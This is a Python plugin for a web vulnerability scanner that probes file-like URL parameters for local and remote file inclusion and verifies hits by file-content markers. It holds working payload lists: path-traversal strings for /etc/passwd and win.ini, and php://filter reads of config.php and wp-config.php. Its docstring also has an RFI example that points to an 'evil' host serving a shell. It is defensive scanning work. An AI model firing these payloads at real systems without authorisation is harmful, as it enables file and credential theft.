"""Plugin: detect Local/Remote File Inclusion (LFI/RFI).

Many web apps take a file path or name as a parameter and pass it to a file
read/include routine without sanitisation. This lets an attacker read
arbitrary files (``/etc/passwd``, ``win.ini``) or, in the worst case, execute
remote code via RFI (``?page=http://evil/shell.txt``).

The plugin is **active**: it sends probe payloads to parameters that look
file-like (``file``, ``page``, ``include``, ``path``, …) and verifies the
response contains actual content markers from the target file. Pure status
200 is NOT enough — too many sites return 200 for everything (soft-404).

For low false positives:

* **Content-verified findings (CRITICAL, FIRM):** response contains actual
  file-content markers like ``root:x:0:0:`` (Linux passwd) or ``[fonts]``
  (Windows win.ini). These are real LFI by definition.
* **Heuristic findings (MEDIUM, TENTATIVE):** response to a path-traversal
  payload differs from the baseline by length, but no file marker matched.
  This often catches custom error pages that leak the included file path —
  real but not exploitable yet.
* **PHP filter findings (HIGH, FIRM):** response to
  ``php://filter/convert.base64-encode/resource=index.php`` decodes as
  valid base64 to PHP-source-like content. Confirmed code leak.

The plugin never sends RFI payloads to external hosts (no `http://attacker/`).
It only tests for local file inclusion via ``file://`` and PHP wrappers, plus
path traversal.
"""
from __future__ import annotations

import base64
import binascii
import re
from urllib.parse import ParseResult, parse_qs, urlencode, urlparse

import aiohttp

from webscan.models import Confidence, Finding, Severity
from webscan.plugins.base import BasePlugin

# ─── Parameter selection ──────────────────────────────────────────────────────

# Parameter names that are likely to be passed to a file/include routine.
# Matched case-insensitively against the *whole* parameter name (not a regex
# on the URL) so we don't fire on unrelated params that happen to contain
# 'file' as a substring (e.g. `?profile_id=12`).
_LFI_PARAM_NAMES: frozenset[str] = frozenset({
    "file", "filename", "filepath", "path", "page", "include",
    "include_file", "document", "doc", "template", "tmpl",
    "tpl", "view", "source", "src", "load", "module", "mod",
    "action", "do", "step", "screen", "body", "content",
    "lang", "language", "locale",  # i18n includes are a classic LFI vector
    "image", "img", "picture", "pic",  # image-resize scripts
    "download", "open", "read", "fetch", "get",
    "cat", "category",  # WordPress category/archive parameters; no generic id
})

# ─── Payloads ─────────────────────────────────────────────────────────────────

# Linux: /etc/passwd has a stable format with these markers.
_LINUX_PASSWD_MARKERS: tuple[str, ...] = ("root:x:0:0:", "root:x:0:1:", "daemon:")

# Linux: /etc/hostname is a single short line — too generic, skipped.
# Linux: /proc/self/environ leaks env vars in NULL-separated format.
_LINUX_ENVIRON_MARKER = "HTTP_"
# Linux: /etc/issue often contains "\n \nUbuntu" or similar.
_LINUX_ISSUE_MARKERS: tuple[str, ...] = ("Ubuntu", "Debian", "CentOS", "Arch", "Alpine")

# Windows: win.ini starts with "; for 16-bit app compatibility" or "[fonts]"
_WINDOWS_WININI_MARKERS: tuple[str, ...] = ("[fonts]", "[extensions]", "[files]")

# Linux path-traversal chains. We try multiple depths because some servers
# strip one or two `../` but not three.
_LINUX_PATH_TRAVERSALS: tuple[str, ...] = (
    "/etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",  # naive ../ strip
    "..%2f..%2f..%2fetc/passwd",  # URL-encoded
    "..%252f..%252f..%252fetc/passwd",  # double-encoded
    "/etc/passwd%00",  # null-byte (PHP < 5.3.4)
)

# Windows path-traversals — relative from typical web root C:\\inetpub\\wwwroot.
_WINDOWS_PATH_TRAVERSALS: tuple[str, ...] = (
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../windows/win.ini",
    "../../../../../../windows/win.ini",
    "..%5c..%5c..%5cwindows/win.ini",
    "..%255c..%255c..%255cwindows/win.ini",
)

# PHP wrappers — `php://filter/convert.base64-encode/resource=<file>` returns
# the file's content base64-encoded, which we can decode and verify.
_PHP_FILTER_TEMPLATE = "php://filter/convert.base64-encode/resource={file}"
_PHP_FILTER_TARGETS: tuple[str, ...] = ("index.php", "config.php", "wp-config.php")

# Markers we look for in decoded PHP-filter output to confirm a real leak.
# Note: PHP `include`/`require` don't require parentheses — `include 'file.php';`
# is valid syntax. We accept both forms.
_PHP_MARKERS: tuple[re.Pattern[str], ...] = (
    re.compile(r"<\?php"),
    re.compile(r"\brequire(?:_once)?\b"),
    re.compile(r"\binclude(?:_once)?\b"),
    re.compile(r"\bdefine\s*\("),
    re.compile(r"\$_(GET|POST|SERVER|COOKIE)\b"),
)

# Response-similarity heuristic for TENTATIVE findings. We compare the probe
# response to the baseline using SequenceMatcher (the same approach as the
# IDOR plugin): a high similarity means the server returned the same page
# (probably ignored the payload); a *low* similarity with no markers and no
# auth error suggests the payload changed something — worth a TENTATIVE flag.
# 0.65 is deliberately stricter than the old size-delta heuristic, which
# fired on any 50-byte delta (one extra ad banner, CSRF token rotation, etc.).
_SIMILARITY_THRESHOLD = 0.65

# Hard cap on length ratio: if probe is 5x bigger or 5x smaller than baseline,
# it's almost certainly an error page or a completely different response, not
# a meaningful LFI signal.
_MIN_LENGTH_RATIO = 0.2
_MAX_LENGTH_RATIO = 5.0

# Cap probes per parameter so we don't hammer the server. Must be high
# enough to let all three probe classes (Linux paths, Windows paths, PHP
# wrappers) fire — otherwise the cap would silently skip Windows/PHP probes
# after exhausting the Linux list.
_MAX_PROBES_PER_PARAM = 30

# Cap total parameters to probe per target — bound request pressure.
_MAX_PARAMS_PER_TARGET = 5

# A probe response containing one of these substrings is treated as an
# explicit "file not found" error and is never a TENTATIVE finding (the
# server did process the payload but the file doesn't exist — interesting
# but not exploitable).
_FILE_NOT_FOUND_MARKERS: tuple[str, ...] = (
    "file not found",
    "no such file",
    "failed to open stream",
    "failed opening",
    "include():",
    "require():",
    "warning: include",
    "warning: require",
)


# ─── Helpers ──────────────────────────────────────────────────────────────────


def _find_lfi_params(target: str) -> list[tuple[str, str]]:
    """Return ``(param_name, original_value)`` pairs that look file-like.

    Looks at the URL's query string and matches parameter names against
    :data:`_LFI_PARAM_NAMES`. Limited to :data:`_MAX_PARAMS_PER_TARGET`.
    """
    parsed = urlparse(target)
    if not parsed.query:
        return []
    out: list[tuple[str, str]] = []
    seen: set[str] = set()
    for name, values in parse_qs(parsed.query, keep_blank_values=True).items():
        if name.lower() in _LFI_PARAM_NAMES and name not in seen:
            value = values[0] if values else ""
            out.append((name, value))
            seen.add(name)
            if len(out) >= _MAX_PARAMS_PER_TARGET:
                break
    return out


def _replace_param(target: str, param: str, value: str) -> str:
    """Return *target* with *param* set to *value*, preserving other params."""
    parsed: ParseResult = urlparse(target)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode({k: v[0] if len(v) == 1 else v for k, v in qs.items()}, doseq=True)
    return parsed._replace(query=new_query).geturl()


def _has_marker(body: str, markers: tuple[str, ...]) -> bool:
    """Case-sensitive substring search — file markers are case-stable."""
    return any(m in body for m in markers)


def _try_decode_base64(text: str) -> str | None:
    """Best-effort base64 decode. Returns None if input isn't valid base64."""
    # Strip whitespace and any HTML wrapping.
    text = text.strip()
    if not text:
        return None
    # Pad to multiple of 4
    text += "=" * (-len(text) % 4)
    try:
        decoded = base64.b64decode(text, validate=True)
        return decoded.decode("utf-8", errors="replace")
    except (binascii.Error, ValueError):
        return None


def _has_php_marker(text: str) -> bool:
    return any(p.search(text) for p in _PHP_MARKERS)


def _has_file_not_found_marker(body: str) -> bool:
    """True if the response looks like an explicit "file not found" error.

    PHP/Python/Ruby include errors emit specific markers that we can detect
    cheaply. Suppressing these as TENTATIVE findings keeps the FP rate low
    because they indicate the server *did* process the path (it tried to
    open the file) but the file doesn't exist — interesting but not
    exploitable on its own.
    """
    lowered = body[:4000].lower()
    return any(m in lowered for m in _FILE_NOT_FOUND_MARKERS)


# ─── Plugin ───────────────────────────────────────────────────────────────────


class LfiRfiPlugin(BasePlugin):
    """Probes file-like parameters for Local/Remote File Inclusion."""

    name = "lfi_rfi"
    description = "Detect LFI/RFI via path traversal + PHP wrappers (content-verified)"

    async def run(
        self,
        target: str,
        session: aiohttp.ClientSession,
    ) -> list[Finding]:
        findings: list[Finding] = []

        params = _find_lfi_params(target)
        if not params:
            return findings

        # Fetch a baseline response (the original URL) so we can compare.
        # Uses the shared retry-enabled helper so transient 5xx/429s don't
        # abort the whole plugin.
        baseline_body, baseline_status = await self._fetch(session, target)
        if baseline_body is None:
            # Can't establish baseline — every finding would be ambiguous.
            return findings

        # Calibrate soft-404 for this target. If the server answers every
        # bogus path with the same templated 200 page, we want to suppress
        # TENTATIVE findings that just match the soft-404 template.
        from webscan.plugins._active_helpers import calibrate_target, is_soft404
        soft_baseline = await calibrate_target(session, target)

        seen_payloads: set[str] = set()

        for param, _original in params:
            probes = 0
            # Linux path traversals — highest priority
            for payload in _LINUX_PATH_TRAVERSALS:
                if probes >= _MAX_PROBES_PER_PARAM:
                    break
                key = f"{param}:{payload}"
                if key in seen_payloads:
                    continue
                seen_payloads.add(key)
                probes += 1

                probe_url = _replace_param(target, param, payload)
                body, status = await self._fetch(session, probe_url)
                if body is None:
                    continue

                # FIRM finding: actual /etc/passwd content marker.
                if _has_marker(body, _LINUX_PASSWD_MARKERS):
                    findings.append(self._make_finding(
                        target=target,
                        param=param,
                        payload=payload,
                        severity=Severity.CRITICAL,
                        confidence=Confidence.FIRM,
                        title=f"LFI confirmed: /etc/passwd leaked via '{param}'",
                        description=(
                            f"The `{param}` parameter accepts a path-traversal "
                            f"payload (`{payload}`) and the response contains the "
                            "actual content of `/etc/passwd`. An attacker can read "
                            "arbitrary files on the server, including SSH keys, "
                            "application configs, and database credentials."
                        ),
                        evidence={
                            "probe_url": probe_url,
                            "http_status": status,
                            "matched_markers": list(_LINUX_PASSWD_MARKERS)[:1],
                            "baseline_status": baseline_status,
                        },
                        remediation=(
                            "Do not pass user input to file-system APIs. Use an "
                            "allow-list of file identifiers and map them to absolute "
                            "paths server-side. If you must accept a path, normalise "
                            "it with `os.path.realpath()` and verify it stays within "
                            "an allowed directory."
                        ),
                    ))
                    # Found a CRITICAL — no point probing more paths for this param.
                    break

                # Skip probes that look like a soft-404 template (server
                # answers 200 for every bogus path with the same page).
                if is_soft404(body, status, soft_baseline):
                    continue

                # Skip explicit "file not found" errors — the server processed
                # the payload but the file doesn't exist. Not exploitable.
                if _has_file_not_found_marker(body):
                    continue

                # TENTATIVE finding: response is structurally *different* from
                # the baseline (low similarity), no markers, no auth error,
                # not a 404. This is much more precise than the old
                # size-delta heuristic, which fired on any 50-byte delta
                # (ad rotation, CSRF token change, timestamp).
                from webscan.plugins._active_helpers import body_similarity
                sim = body_similarity(body, baseline_body)
                lr = len(baseline_body) / len(body) if body else 0.0
                if (
                    sim < _SIMILARITY_THRESHOLD
                    and status != 404
                    and _MIN_LENGTH_RATIO <= lr <= _MAX_LENGTH_RATIO
                ):
                    findings.append(self._make_finding(
                        target=target,
                        param=param,
                        payload=payload,
                        severity=Severity.MEDIUM,
                        confidence=Confidence.TENTATIVE,
                        title=f"Possible LFI via '{param}' (path traversal, manual review needed)",
                        description=(
                            f"The `{param}` parameter accepts a path-traversal "
                            f"payload (`{payload}`) and the response differs from "
                            f"the baseline structurally (similarity {sim:.2f}, "
                            f"length ratio {lr:.2f}, HTTP {status} vs baseline "
                            f"{baseline_status}). No /etc/passwd marker matched, "
                            "but the structural delta suggests the server may have "
                            "processed the path. Manual verification needed."
                        ),
                        evidence={
                            "probe_url": probe_url,
                            "http_status": status,
                            "baseline_status": baseline_status,
                            "baseline_length": len(baseline_body),
                            "response_length": len(body),
                            "similarity": round(sim, 3),
                            "length_ratio": round(lr, 3),
                        },
                        remediation=(
                            "Treat user input as untrusted. Use an allow-list of "
                            "files, normalise paths with `os.path.realpath()`, "
                            "and reject any path that escapes the allowed root."
                        ),
                    ))
                    break  # one TENTATIVE per param is enough

            # If path traversal didn't yield a CRITICAL, try Windows paths.
            for payload in _WINDOWS_PATH_TRAVERSALS:
                if probes >= _MAX_PROBES_PER_PARAM:
                    break
                key = f"{param}:{payload}"
                if key in seen_payloads:
                    continue
                seen_payloads.add(key)
                probes += 1

                probe_url = _replace_param(target, param, payload)
                body, status = await self._fetch(session, probe_url)
                if body is None:
                    continue

                if _has_marker(body, _WINDOWS_WININI_MARKERS):
                    findings.append(self._make_finding(
                        target=target,
                        param=param,
                        payload=payload,
                        severity=Severity.CRITICAL,
                        confidence=Confidence.FIRM,
                        title=f"LFI confirmed: win.ini leaked via '{param}'",
                        description=(
                            f"The `{param}` parameter accepts a Windows path-"
                            f"traversal payload (`{payload}`) and the response "
                            "contains the actual content of `win.ini`. An attacker "
                            "can read arbitrary files on the Windows server."
                        ),
                        evidence={
                            "probe_url": probe_url,
                            "http_status": status,
                            "matched_markers": list(_WINDOWS_WININI_MARKERS)[:1],
                            "baseline_status": baseline_status,
                        },
                        remediation=(
                            "Do not pass user input to file-system APIs. Use an "
                            "allow-list and validate the resolved absolute path stays "
                            "within an allowed directory."
                        ),
                    ))
                    break

            # PHP filter wrappers — independent check, even if traversal failed.
            for php_file in _PHP_FILTER_TARGETS:
                if probes >= _MAX_PROBES_PER_PARAM:
                    break
                payload = _PHP_FILTER_TEMPLATE.format(file=php_file)
                key = f"{param}:{payload}"
                if key in seen_payloads:
                    continue
                seen_payloads.add(key)
                probes += 1

                probe_url = _replace_param(target, param, payload)
                body, status = await self._fetch(session, probe_url)
                if body is None:
                    continue

                decoded = _try_decode_base64(body)
                if decoded and _has_php_marker(decoded):
                    findings.append(self._make_finding(
                        target=target,
                        param=param,
                        payload=payload,
                        severity=Severity.HIGH,
                        confidence=Confidence.FIRM,
                        title=f"PHP source leak via '{param}' (php://filter wrapper)",
                        description=(
                            f"The `{param}` parameter accepts a PHP stream wrapper "
                            f"(`{payload}`) and the response decodes to valid PHP "
                            f"source from `{php_file}`. An attacker can read any PHP "
                            "file on the server, including configuration files with "
                            "database credentials."
                        ),
                        evidence={
                            "probe_url": probe_url,
                            "http_status": status,
                            "leaked_file": php_file,
                            "decoded_preview": decoded[:200],
                        },
                        remediation=(
                            "Reject PHP stream wrappers in user input. Validate "
                            "that the parameter is a plain filename (no `://`, no "
                            "path separators) and map it to a server-side path."
                        ),
                    ))
                    break

        return findings

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    async def _fetch(
        self,
        session: aiohttp.ClientSession,
        url: str,
    ) -> tuple[str | None, int]:
        """GET *url* with retry on transient failures.

        Returns ``(body, status)`` or ``(None, 0)`` if every retry attempt
        failed. Uses :func:`webscan.retry.request_with_retry` so transient
        ``5xx`` / ``429`` responses ride out with exponential backoff
        instead of aborting the whole plugin.
        """
        from webscan.plugins._active_helpers import fetch_with_retry
        result = await fetch_with_retry(session, url, method="GET")
        if result is None:
            return None, 0
        body, status, _ct = result
        return body, status

    def _make_finding(
        self,
        *,
        target: str,
        param: str,
        payload: str,
        severity: Severity,
        confidence: Confidence,
        title: str,
        description: str,
        evidence: dict[str, object],
        remediation: str,
    ) -> Finding:
        return Finding(
            plugin=self.name,
            title=title,
            severity=severity,
            confidence=confidence,
            description=description,
            url=target,
            evidence={
                "param": param,
                "payload": payload,
                **evidence,
            },
            remediation=remediation,
        )
